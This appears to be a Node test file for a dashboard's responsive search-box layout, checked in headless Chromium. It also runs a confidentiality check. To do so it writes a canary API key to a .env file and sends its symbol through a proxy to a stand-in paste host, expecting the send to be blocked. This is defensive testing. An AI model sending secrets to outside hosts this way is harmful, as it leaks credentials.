/**
 * product-find-width.test — on a phone each Find box sits under its label
 * and its hint reads whole, in a real headless Chromium over the REAL
 * components (dashboard.md §4.25ae *On a phone, the box under its label*).
 * Mandu-new.
 *
 * Until 2026-10-28 History's Find a session shared its line with its label
 * at every width, so at 390 px the box was about 250 px wide and its hint
 * read "What you asked, the agent or the fo": the folder, which the search
 * reads too, was lost.
 *
 * The design width (2026-11-05): a phone lays text out at each glyph's
 * fractional advance, and so does a full Chrome at any scale, but
 * Playwright's headless shell rounds each advance of the served font to a
 * whole pixel. History's hint of 2026-11-02, "What you asked, a folder, a
 * secret or a host", needs 268.1 px in IBM Plex Sans at 14 px and the box
 * holds 266 px at 320 px; the headless shell measured it at exactly 266.0
 * and passed, Chrome on GitHub's runner measured 268.1 and failed. Ten
 * times the size makes that rounding a tenth as large, so the check reads
 * what a phone draws in every Chromium.
 *
 * Here a real ArbiterServer (`secrets`); the REAL anthropic-proxy on its
 * production client carries one session, so History lists it and shows its
 * box; the net-proxy on its production client stops one send of a
 * registered key, answered Block over the real route, so Approvals ›
 * Answered earlier shows Find an answer; a real DashboardServer; and a
 * headless Chromium driven over the DevTools protocol
 * (scripts/tour-screenshots.mjs), signed in. On /history (`#history-q`)
 * and /approvals (`#answered-q`):
 *
 *   P1  at 390 and 320 px the box is under its label, the form's whole
 *       width, and its placeholder, measured in the box's own font, fits
 *       its content box: the wider of its width at the box's size and its
 *       design width (measured at ten times the size and scaled back);
 *   P2  at 980 px the label and the box share one line, the box right of
 *       the label;
 *   P3  the oracle: nothing left the machine, and no page drawn here
 *       carries the key's value or a token.
 *
 * Self-SKIPs without a Chromium (scripts/tour-screenshots.mjs probeBrowser:
 * MANDU_TOUR_BROWSER, CHROME_PATH, a Playwright headless shell, or one on
 * PATH). Axes: secrets (stated).
 */
import { test } from "node:test";
import assert from "node:assert/strict";
import { mkdirSync, mkdtempSync, rmSync, writeFileSync } from "node:fs";
import { request as httpRequest } from "node:http";
import { tmpdir } from "node:os";
import { dirname, join } from "node:path";
import { fileURLToPath, pathToFileURL } from "node:url";

import { ArbiterServer } from "../../arbiter/ipc/server.js";
import { ArbiterClient } from "../../arbiter/ipc/client.js";
import { AnthropicProxy } from "../../interceptors/anthropic-proxy/src/proxy.js";
import { ArbiterClientAdapter } from "../../interceptors/anthropic-proxy/src/arbiter-client.js";
import { MockUpstream, buildTextSse } from "../../interceptors/anthropic-proxy/test/helpers/mock-upstream.js";
import { NetProxy } from "../../interceptors/net-proxy/src/proxy.js";
import { ArbiterClientAdapter as NetArbiterClientAdapter, type RealArbiterClient } from "../../interceptors/net-proxy/src/arbiter-client.js";
import { DashboardServer, type ApprovalsArbiter } from "../../dashboard/src/server.js";
import { ArbiterEventSource } from "../../dashboard/src/event-source.js";
import { pageFetch } from "../../dashboard/test/unit/page-fetch.js";
import { stateAxes } from "../lib/axes.js";
import { humanSockIn } from "../lib/human-plane.js";

stateAxes("secrets"); // confidentiality ON, integrity OFF

const REPO = join(dirname(fileURLToPath(import.meta.url)), "..", "..");
// eslint-disable-next-line @typescript-eslint/no-explicit-any
interface Cdp { send(method: string, params?: object, sessionId?: string): Promise<any>; close(): void }
const tour = (await import(pathToFileURL(join(REPO, "scripts", "tour-screenshots.mjs")).href)) as {
  probeBrowser: (o?: object) => string | null;
  startBrowser: (path: string, dataDir: string, env: NodeJS.ProcessEnv) => Promise<{ proc: unknown; wsUrl: string }>;
  stopProc: (proc: unknown) => Promise<void>;
  Cdp: { connect(url: string): Promise<Cdp> };
};
const browser = tour.probeBrowser({});

const VALUE = "sk_" + `live_findWidthStackCanary_${process.pid}`;
const SESSION = `find-width-${process.pid}`;
const NET_SESSION = "1791300000-140";
const CSRF = { "X-Mandu-Control": "1" };

/** One absolute-form request through the forward proxy. */
function viaProxy(port: number, url: string, body: string): Promise<{ status: number; body: string }> {
  const u = new URL(url);
  return new Promise((resolve, reject) => {
    const req = httpRequest(
      { host: "127.0.0.1", port, method: "POST", path: url, headers: { host: u.host, "content-type": "text/plain", "content-length": Buffer.byteLength(body) } },
      (res) => {
        const chunks: Buffer[] = [];
        res.on("data", (c) => chunks.push(c));
        res.on("end", () => resolve({ status: res.statusCode ?? 0, body: Buffer.concat(chunks).toString("utf8") }));
        res.on("error", reject);
      },
    );
    req.on("error", reject);
    req.end(body);
  });
}

/** The box, its label and its form (window px), its placeholder's width in
 *  the box's own font, and the box's content width. The width is the wider
 *  of the one at the box's size and the design width, measured at ten times
 *  the size and scaled back (a renderer that rounds each glyph's advance
 *  to a whole pixel, as the headless shell does with the served font,
 *  rounds it a tenth as much there). */
interface Box { left: number; right: number; top: number; bottom: number }
interface Shot { hint: string; need: number; room: number; box: Box; label: Box; form: Box }
const measure = (id: string) => `(() => {
  const box = document.getElementById(${JSON.stringify(id)});
  const cs = getComputedStyle(box);
  const ctx = document.createElement("canvas").getContext("2d");
  const at = (size) => { ctx.font = [cs.fontStyle, cs.fontWeight, size + "px", cs.fontFamily].join(" "); return ctx.measureText(box.placeholder).width; };
  const size = parseFloat(cs.fontSize);
  const r = (el) => { const b = el.getBoundingClientRect(); return { left: b.left, right: b.right, top: b.top, bottom: b.bottom }; };
  return {
    hint: box.placeholder, need: Math.max(at(size), at(size * 10) / 10),
    room: box.clientWidth - parseFloat(cs.paddingLeft) - parseFloat(cs.paddingRight),
    box: r(box), label: r(document.querySelector('label[for=' + JSON.stringify(${JSON.stringify(id)}) + ']')), form: r(box.form),
  };
})()`;

test("on a phone each Find box sits under its label and its hint reads whole; wider, they share a line; in a real Chromium over the real arbiter, proxies and dashboard; no value on the page (secrets axes)", {
  skip: browser ? false : "no Chromium found (MANDU_TOUR_BROWSER, CHROME_PATH, a Playwright headless shell)", timeout: 240_000,
}, async () => {
  const tmp = mkdtempSync(join(tmpdir(), "mandu-find-width-"));
  const home = join(tmp, "home");
  const repo = join(home, "shop");
  mkdirSync(repo, { recursive: true });
  const socketPath = join(tmp, "arbiter.sock");
  const adminSock = join(tmp, "admin.sock");
  const humanPath = humanSockIn(tmp);
  const arbiter = new ArbiterServer({
    socketPath, adminSocketPath: adminSock, humanSocketPath: humanPath,
    dbPath: join(tmp, "mandu.db"), eventDir: join(tmp, "events"), log: () => {},
    confidentiality: true, integrity: false, // the `secrets` axes, stated
  });
  await arbiter.listen();
  // The anthropic-proxy's production wiring (anthropic-proxy/src/server-main.ts).
  const data = new ArbiterClient(socketPath);
  await data.connect();
  const human = new ArbiterClient(humanPath);
  await human.connect();
  let upstream = new MockUpstream({ sse: buildTextSse("ok") });
  const toModel: string[] = [];
  const model = new AnthropicProxy({ arbiter: new ArbiterClientAdapter(data, human), upstream: (x) => upstream.fetcher(x), log: () => {} });
  const modelPort = await model.listen(0);
  // The net-proxy's production wiring (net-proxy/src/server-main.ts).
  const netClient = new ArbiterClient(socketPath);
  await netClient.connect();
  const netHuman = new ArbiterClient(humanPath);
  const forwarded: string[] = [];
  const net = new NetProxy({
    arbiter: new NetArbiterClientAdapter(netClient as unknown as RealArbiterClient, netHuman),
    sessionId: NET_SESSION,
    forwarder: async ({ url }) => {
      forwarded.push(url);
      throw new Error("a stopped send must never be forwarded");
    },
    log: () => {},
  });
  const netPort = await net.listen(0);
  const gate = new ArbiterClient(socketPath); await gate.connect();
  const admin = new ArbiterClient(adminSock); await admin.connect();
  const approvalsArbiter: ApprovalsArbiter = {
    egressApprovals: (status) => admin.egressApprovals(status),
    resolveEgressApproval: (approvalId, approve, scope) => admin.resolveEgressApproval(approvalId, approve, scope),
  };
  const dashboard = new DashboardServer({
    source: new ArbiterEventSource({ socketPath, humanSocketPath: humanPath }),
    approvalsArbiter,
    fileBrowserHome: home,
    configEnv: { MANDU_HOME: join(tmp, "mandu-home") },
    log: () => {},
  });
  const base = `http://127.0.0.1:${await dashboard.listen(0)}`;
  const cookie = dashboard.adminCookie();
  let proc: unknown = null;
  let cdp: Cdp | null = null;
  const pages: string[] = [];
  try {
    // One session through the model proxy, so History lists it.
    upstream = new MockUpstream({ sse: buildTextSse("It looks fine.") });
    const r = await pageFetch(`http://127.0.0.1:${modelPort}/v1/messages`, {
      method: "POST",
      headers: { "content-type": "application/json", "x-mandu-session-id": SESSION, "user-agent": "claude-cli/2.1.289 (external, cli)" },
      body: JSON.stringify({
        model: "claude-opus-4", stream: true, messages: [{ role: "user", content: "Check the shop's deploy." }],
        system: [{ type: "text", text: `You are Claude Code.\n\n# Environment\n - Primary working directory: ${repo}\n - Platform: linux` }],
      }),
    });
    assert.equal(r.status, 200, await r.text());
    toModel.push(upstream.requests[0]!.bodyText);
    // One stopped send of a registered key, answered Block over the real route.
    const env = join(repo, ".env");
    writeFileSync(env, `SHOP_KEY=${VALUE}\n`);
    const reg = await gate.registerSecret({ path: env, sessionKey: NET_SESSION });
    const sym = /\$MDU:nomodel_Read\[[0-9a-f]+\]\.SHOP_KEY/.exec(reg.twin ?? "")?.[0];
    assert.ok(sym, "the key has its symbol");
    const sent = await viaProxy(netPort, "http://paste.example/upload", `k=${sym}`);
    assert.equal(sent.status, 403, `the send is stopped: ${sent.body}`);
    const pending = await admin.egressApprovals("pending");
    assert.equal(pending.length, 1, "one question");
    const denied = await pageFetch(`${base}/api/egress/approvals/${pending[0]!.id}/deny`, { method: "POST", headers: { ...CSRF, Cookie: cookie } });
    assert.equal(denied.status, 200);
    // The session is listed (emission is best-effort and asynchronous).
    let listed = 0;
    for (let i = 0; i < 200 && !listed; i++) {
      listed = ((await (await pageFetch(`${base}/api/home/history`, { headers: { Cookie: cookie } })).json()) as { total: number }).total;
      if (!listed) await new Promise((res) => setTimeout(res, 25));
    }
    assert.ok(listed > 0, "History has a session to find");

    const started = await tour.startBrowser(browser as string, join(tmp, "chrome"), process.env);
    proc = started.proc;
    cdp = await tour.Cdp.connect(started.wsUrl);
    const { targetId } = await cdp.send("Target.createTarget", { url: "about:blank" });
    const { sessionId } = await cdp.send("Target.attachToTarget", { targetId, flatten: true });
    const s = (method: string, params: object = {}) => cdp!.send(method, params, sessionId);
    const evaluate = async (expression: string) => {
      const res = await s("Runtime.evaluate", { expression, returnByValue: true, awaitPromise: true });
      if (res.exceptionDetails) throw new Error(`page script failed: ${res.exceptionDetails.exception?.description ?? res.exceptionDetails.text}`);
      return res.result.value;
    };
    await s("Page.enable");
    await s("Runtime.enable");
    await s("Network.enable");
    const eq = cookie.indexOf("=");
    await s("Network.setCookie", { name: cookie.slice(0, eq), value: cookie.slice(eq + 1), url: base, httpOnly: true, sameSite: "Strict" });
    const settle = () => evaluate("new Promise((r) => requestAnimationFrame(() => requestAnimationFrame(() => setTimeout(() => r(true), 200))))");
    /** Opens `path` and waits until `ready` holds on the page. */
    const open = async (path: string, ready: string) => {
      await s("Page.navigate", { url: base + path });
      let ok = false;
      for (const end = Date.now() + 30_000; Date.now() < end && !ok; await new Promise((res) => setTimeout(res, 100))) {
        try {
          ok = await evaluate(`document.readyState === "complete" && document.fonts.status === "loaded" && (${ready})`);
        } catch { /* navigating */ }
      }
      assert.ok(ok, `${path}: ${ready}`);
      await settle();
      pages.push(await evaluate("document.documentElement.outerHTML + document.body.innerText"));
    };

    const CASES = [
      { path: "/history", id: "history-q", hint: "What you asked, a folder, secret or host",
        ready: `!document.getElementById("history-search").hidden && !!document.querySelector("#history-list .row.agent")` },
      { path: "/approvals", id: "answered-q", hint: "A secret, a host or the agent",
        ready: `!document.getElementById("answered-search").hidden && !!document.querySelector("#approvals-answered .row.answered")` },
    ];
    for (const width of [390, 320, 980]) {
      await s("Emulation.setDeviceMetricsOverride", { width, height: 900, deviceScaleFactor: 1, mobile: width < 640 });
      for (const c of CASES) {
        const at = `#${c.id} at ${width}px`;
        await open(c.path, c.ready);
        const m = await evaluate(measure(c.id)) as Shot;
        assert.equal(m.hint, c.hint, `${at}: its hint as written`);
        if (width < 500) {
          // P1: under its label, the whole width, the hint whole.
          assert.ok(m.box.top >= m.label.bottom - 1, `${at}: under its label (${JSON.stringify(m)})`);
          assert.ok(Math.abs(m.box.left - m.form.left) <= 1 && Math.abs(m.box.right - m.form.right) <= 1, `${at}: the form's whole width (${JSON.stringify(m)})`);
          assert.ok(m.need <= m.room, `${at}: its hint needs ${m.need.toFixed(1)}px and the box holds ${m.room.toFixed(1)}px ("${m.hint}")`);
        } else {
          // P2: one line, the box right of the label.
          assert.ok(m.box.top < m.label.bottom && m.label.top < m.box.bottom, `${at}: the label and the box share a line (${JSON.stringify(m)})`);
          assert.ok(m.box.left >= m.label.right, `${at}: the box right of its label (${JSON.stringify(m)})`);
          assert.ok(m.need <= m.room, `${at}: its hint fits (${m.need.toFixed(1)} of ${m.room.toFixed(1)}px)`);
        }
      }
    }

    // P3: the oracle.
    assert.equal(pages.length, 6, "every page was read");
    for (const p of pages) {
      assert.ok(!p.includes(VALUE), "CONFIDENTIALITY VIOLATION: the key's value on a page");
      assert.doesNotMatch(p, /\$MDU/, "nor a token");
    }
    assert.deepEqual(forwarded, [], "nothing left the machine");
    for (const body of toModel) assert.ok(!body.includes(VALUE), "CONFIDENTIALITY VIOLATION: the model got the key's value");
  } finally {
    cdp?.close();
    if (proc) await tour.stopProc(proc);
    await model.close();
    await net.close();
    await dashboard.close();
    data.close(); human.close();
    netClient.close(); netHuman.close();
    gate.close(); admin.close();
    await arbiter.close();
    rmSync(tmp, { recursive: true, force: true });
  }
});
